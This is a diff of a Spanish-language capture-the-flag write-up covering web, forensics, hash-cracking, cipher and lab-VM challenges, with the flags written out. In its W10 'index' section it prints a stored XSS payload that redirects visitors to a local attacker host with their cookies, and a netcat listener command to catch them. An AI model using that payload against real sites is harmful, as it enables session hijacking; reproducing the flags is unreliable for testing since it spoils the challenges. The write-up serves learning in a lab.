@@ -4,7 +4,7 @@
 
 En la página del CTF ir al apartado de rules  y hasta el final de esa página está la flag
 
-![c54b75e81b7c5c139e233643fab197d8](https://user-images.githubusercontent.com/70277640/199324838-fd893c65-c853-4fd2-8b76-db33edf560b0.png)
+![c54b75e81b7c5c139e233643fab197d8](https://user-images.githubusercontent.com/70277640/199337483-bf3d9e0b-eb00-4890-becb-04caab0ec8a5.png)
 
 **flag{M1\_Pr1m3r4\_fl46}**
 
@@ -14,7 +14,7 @@ En la página del CTF ir al apartado de rules  y hasta el final de esa página 
 
 En la página principal del sitio del CTF abrimos las herramientas de desarrollador y en el inspector de código buscamos "flag". Encontramos la flag como un comentario dentro de un tag a
 
-![b3898db6115ab22e6f602c58ee36c720](https://user-images.githubusercontent.com/70277640/199325004-de8b300c-076b-4c8a-be68-9644b1af0e05.png)
+![b3898db6115ab22e6f602c58ee36c720](https://user-images.githubusercontent.com/70277640/199337526-76cfc4f2-5642-490c-8aa6-025369c39853.png)
 
 **flag{h7ml_1nd3x}**
 
@@ -22,7 +22,7 @@ En la página principal del sitio del CTF abrimos las herramientas de desarrolla
 
 Navegamos a la página web oficial de la casa blanca en https://www.whitehouse.gov/ y en el código fuente en el primer comentario está un link que nos lleva a la página web del servicio digital de USA https://www.usds.gov/. Ya que estamos en esa página en el código fuente aparece el cangrejo del reto y su nombre
 
-<img src=":/343467c8159c48faa3a9088ce5e8867c" alt="30e236d500b31bae1f5e4e04b95fc880.png" width="674" height="246" class="jop-noMdConv">
+![30e236d500b31bae1f5e4e04b95fc880](https://user-images.githubusercontent.com/70277640/199337625-7575b4a4-7df2-43a0-b7b8-acc589c88ebc.png)
 
 **flag{Mollie}**
 
@@ -32,11 +32,11 @@ Navegamos a la página web oficial de la casa blanca en https://www.whitehouse.g
 
 Descargamos la imagen que está en la descripción del reto y la abrimos en metadata2go para encontrar el comentario que nos mencionaron
 
-<img src=":/7cb91b8779734694a4a6eba45e99a06f" alt="ad430d57115f80ac7bff7f0f7f7bf3d4.png" width="356" height="312" class="jop-noMdConv">
+![ad430d57115f80ac7bff7f0f7f7bf3d4](https://user-images.githubusercontent.com/70277640/199337704-a440573e-0ed7-4f07-9edc-43f7fcf5abdf.png)
 
 Copiamos esta cadena de texto y en cyberchef la decodificamos como base64 para encontrar la flag
 
-<img src=":/e51614e75a0748219d4798770265cbbf" alt="2ec3ea1b52f021bac84616039f9b011b.png" width="478" height="249" class="jop-noMdConv">
+![2ec3ea1b52f021bac84616039f9b011b](https://user-images.githubusercontent.com/70277640/199337732-a9c6c711-395d-4785-a587-6feab7176fe4.png)
 
 **flag{the\_m3tadata\_1s_modified}**
 
@@ -145,3 +145,131 @@ Accedemos a la red con la contraseña que acabamos de obtener y en un navegador 
 # Real Hacking
 
 ## Hashes
+
+Le damos click al link que está en la descripción del reto y nos redigirá a una página con un montón de hashes
+
+<img src=":/610f0464752f4b4c8fc8603ec6b1b61b" alt="ad9a0703e5e5a3117fc07d34b36f9fe1.png" width="833" height="324" class="jop-noMdConv">
+
+Para separar los hashes en diferentes lineas cree un pequeño programa en python que me los regresa ya separados en diferentes lineas. De esta forma puedo ir metiendo de 20 en 20 hashes en CrackStation
+
+<img src=":/4c57646a4cbe45699c0f3f8bbfc89687" alt="4d04b56a4d269aa2477700c75f129aa2.png" width="427" height="139" class="jop-noMdConv"> <img src=":/c6b6b6dcea78439da25734716d0be95d" alt="c93fcb137ab1e120216c1f2e8b838e05.png" width="443" height="159" class="jop-noMdConv">
+
+Al ingresar los primeros 20 hashes vemos que cada hash es una letra de un mensaje que nos dejaron para el reto
+
+<img src=":/57be518e91f44ced9a7dfcf17530dca2" alt="2ceaaadaeae56610f2c4e2b4df71c6d1.png" width="638" height="393" class="jop-noMdConv">
+
+Asumiendo que la flag está hasta el final del mensaje tomo los últimos 20 hashes y los meto en CrackStation
+
+<img src=":/8952ffcc6b7542beb017bca718897fce" alt="a08ee78675b4a917c3a622ee10a33a6b.png" width="681" height="426" class="jop-noMdConv">
+
+Ya que la flag no está completa meto unos cuantos hashes que están atrás de los últimos 20 que ingresé y obtengo la flag completa
+
+<img src=":/0321fea96d684554ab69fb689f25436f" alt="3e68acac059e1563a7bf541848a390af.png" width="688" height="437" class="jop-noMdConv">
+
+**flag{WELC0ME-T0-MEXICAN-H4SHES}**
+
+## Ciphertext
+
+Le damos click al link que está en la descripción del reto y nos redigirá a una página con el texto cifrado
+
+<img src=":/12184893d84b4539b2a96c7e12e91062" alt="c91a5fd2444773689f0da4c43bf55a8c.png" width="1003" height="79" class="jop-noMdConv">
+
+Al leer la hint del reto vemos que es un criptograma. Buscamos un desencriptador de criptogramas online y metemos el texto del reto ahí para obtener la flag
+
+<img src=":/e909310801134c3ba201ffe9059186a4" alt="2407418019151400a2a67fcf1f148ec8.png" width="956" height="103" class="jop-noMdConv">
+
+**FLAGISARADARARDR**
+
+## Kim Web
+
+Descargamos el archivo comprimido que está en la descripción del reto y lo descomprimimos en una VM de Kali. Al revisar lo que había dentro del archivo comprimido encontramos lo siguiente
+
+<img src=":/20c9fa009e3f4cc786b93caec7596578" alt="9f7288734e5eefc18700d1e4cc529b48.png" width="457" height="175" class="jop-noMdConv">
+
+Al abrir el index.html en el navegador de Firefox vemos la página web de Kim. Si analizamos el código fuente de la página podemos ver que hay un tag de script que parece tener código ofuscado.
+
+<img src=":/5b310873da394f6bac2efdbbc23e0237" alt="8004eb1800505cac01f6a6331193dfe1.png" width="698" height="335" class="jop-noMdConv">
+
+Copiamos este código y lo pegamos en una herramienta en linea para darle formato a código sin formato de JS como js-beautify y ahí encontramos la flag
+
+<img src=":/d9185cb6aae442d8954cde591cc1cf21" alt="afb960013a73c7d1361ccd53aed08ff9.png" width="764" height="287" class="jop-noMdConv">
+
+**flag{Do\_You\_Know_??\_I\_4m\_Kim\_Anime\_Watcher\_And\_Web\_Applications_Hacker}**
+
+## PyCode
+
+Descargamos el archivo comprimido que está en la descripción del reto y lo descomprimimos en una VM de Kali. Al enlistar los archivos que estaban comprimidos encontramos uno con un nombre muy particular
+
+<img src=":/bb5df4c38cf0412e9e4e16aba8543bef" alt="07ddd603b340860a96c40503b3c3f50e.png" width="415" height="275" class="jop-noMdConv">
+
+Usando el comando strings sobre ese archivo encontramos un link de pastebin
+
+<img src=":/5f375cda74e74ec0bee9054068ba22c0" alt="44d311234ee98b9c25e12d4b2b72a89e.png" width="262" height="192" class="jop-noMdConv">
+
+Al navegar al link de pastebin encontramos un código de Python que tiene una cadena de texto que parece ser hexadecimal
+
+![201cf26992e0d0fc7bbd7594ebd0d44c.png](:/8a4551b77cf04cf89296dc4a5d8c9b50)
+
+Si llevamos esta cadena hexadecimal a cyberchef para decodificarla obtenemos la flag
+
+<img src=":/1686a5c790f74e11a75a51f65486e11f" alt="95845c0dd4bf4e41209045e9cee540bf.png" width="497" height="283" class="jop-noMdConv">
+
+**flag{1337_4l11111f3}**
+
+# W10
+
+Para realizar estos retos es necesario utilizar la VM que nos hicieron descargar. Una vez que la descargamos la VM y la importamos a VirtualBox, le subimos la RAM a 4 GB y le agregamos una interfaz Host-Only (esto es por gusto personal, para obtener la IP de la máquina de forma más rápida). Para poder escanear esta máquina con nuestra VM de Kali es necesario que la VM de Kali tenga una interfaz Host-Only también.
+
+## index
+
+En nuestra VM de Kali escaneamos la VM de Windows para ver qué puertos tiene abiertos
+
+<img src=":/fcd989b6bb1d4fedb06ca5b05f0b434c" alt="634c62c8228d1bf4105531b47bdba06d.png" width="478" height="384" class="jop-noMdConv">
+
+Al navegar a la IP de la VM de Windows en un navegador web podemos ver la página web que está montada en la máquina
+
+<img src=":/70d211e2ac3b4d6fae8ed77cda0eccc5" alt="d367d8fceb3fca059a7283efb57b250e.png" width="614" height="313" class="jop-noMdConv">
+
+Al revisar el robots.txt descubrimos que la página fue hecha utilizando WordPress (wp) y también descubrimos el nombre del sitio web que hostea la VM de Windows (esto lo necesitaremos para otro reto)
+
+![432292d57d144e00a01fb07d00d4cc10.png](:/a5ef6cda000b461dac03484ae76356de)
+
+Sabiendo que WordPress utiliza mayormente PHP y relacionando eso con el nombre del reto (index) podemos asumir que la página tiene un archivo index.php. al navegar a http://192.168.2.4/index.php encontramos una página que coincide con lo que se nos dice en la descripción del reto
+
+<img src=":/5a3dec6f2aad4ac699db86852d395220" alt="f79eb1264aa270b9c93d757a81b674fe.png" width="405" height="159" class="jop-noMdConv">
+
+Como ya hice la inyección de XSS a la página no me aparece el campo para ingresar texto, pero esta página originalmente lo que hace es que todo lo que introduzcamos al campo de texto y guardemos se reflejará en la página, aun cuando vayamos a otra ruta y volvamos a esta misma página. Sabiendo esto, podemos intentar hacer un Stored XSS con `<script> window.location='http://192.168.2.10/?c=' + document.cookie; </script>` para enviarnos la cookie de la página a un listener que levantaremos en Kali. Al revisar el código fuente de la página para ver si logramos inyectar el script podemos ver que esto funcionó y ahora cada vez que ingresamos a esta página se enviará la cookie a nuestra VM de Kali
+
+<img src=":/0a7e065ecac14a63b7ed5def2fd7f71d" alt="d786b650098a667b63e600fd359f6cfe.png" width="480" height="472" class="jop-noMdConv">
+
+Para poder recibir la cookie levantamos un listener en nuestra VM de Kali con `nc -lnvp 80` y volvemos a ingresar a la página de index.php en nuestro navegador para obtener la cookie, que a su vez contiene la flag
+
+<img src=":/6eeec0f65abd4e5eb1833612050d3c7b" alt="0fead0b32457359a7ba4afa30352eefb.png" width="821" height="193" class="jop-noMdConv">
+
+Ya lo único que necesitamos hacer es decodificar lo que está codificado como URL para obtener la flag
+
+**FLAG{sanitize_input}**
+
+## Commits
+
+Como vimos en el robots.txt, encontramos el nombre de la página web
+
+<img src=":/6964171c3c854a81872de83717d68c46" alt="cd068f2795d29b3f699dfdc8dfdf67b4.png" width="437" height="95">
+
+Agregamos esta IP y el dominion a /etc/hosts para poder navegar a la página a través de Firefox
+
+![269d7f5deed1c376ef0fd8999fe0948b.png](:/2b4bc2a50db84af19b794600ff11191d)
+
+Una vez que hacemos esto podemos ver la página web que se está hosteando en la VM de Windows y al ir al final de la página podemos ver links a Facebook y a GitHub
+
+<img src=":/15a412dd2f594ed89f6140bf6abb8e0d" alt="4fe11378db4156f54800d77b06446592.png" width="530" height="314">
+
+Al presionar el link somos redireccionados a la página de GitHub del usuario GeoHome, que tiene un repositorio GeoAPI
+
+<img src=":/57aacd9cab4d429d88982b1f96d69faf" alt="a6b0b5f586013132b115350738293b04.png" width="656" height="307">
+
+Al entrar al repositorio y ver el historial de commits encontraremos un commit cuyo título es la flag de este reto
+
+<img src=":/e6061db4027549dba8d4607113b7e279" alt="c3bd3768ab18b59bb8cc0d3e8763a2e1.png" width="759" height="269">
+
+ **FLAG{ALWAYS\_CHECK\_COMMITS} **
